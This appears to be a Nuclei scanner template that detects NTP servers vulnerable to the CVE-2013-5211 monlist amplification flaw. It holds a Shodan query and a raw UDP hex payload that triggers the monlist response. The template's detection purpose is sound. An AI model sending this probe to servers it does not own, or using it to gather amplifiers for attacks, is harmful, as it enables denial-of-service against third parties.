id: CVE-2013-5211

info:
  name: NTPd < 4.2.7p26 - NTP traffic amplification DoS
  author: asteria121,rahaaaiii,breakpackm,ingbunga,gy741
  severity: medium
  description: |
    The monlist feature in ntp_request.c in ntpd in NTP before 4.2.7p26 allows remote attackers to cause a denial of service (traffic amplification) via forged (1) REQ_MON_GETLIST or (2) REQ_MON_GETLIST_1 requests, as exploited in the wild in December 2013.
  reference:
    - https://nvd.nist.gov/vuln/detail/cve-2013-5211
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-5211
  classification:
    cvss-score: 5.0
    cve-id: CVE-2013-5211
  metadata:
    verified: false
    max-request: 1
    shodan-query: "port:123"   
  tags: cve,udp,cve2013,ntp,drdos

javascript:
  - pre-condition: |
      isUDPPortOpen(Host,Port);
    code: |
      let c = require("nuclei/net");
      let conn = c.Open('udp', `${Host}:${Port}`);
      conn.SendHex('1700032A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000');
      resp = conn.RecvHex(40000);
      resp;

    args:
      Host: "{{Host}}"
      Port: 123

    matchers:
      - type: dsl
        dsl:
          - "len(response)>1"
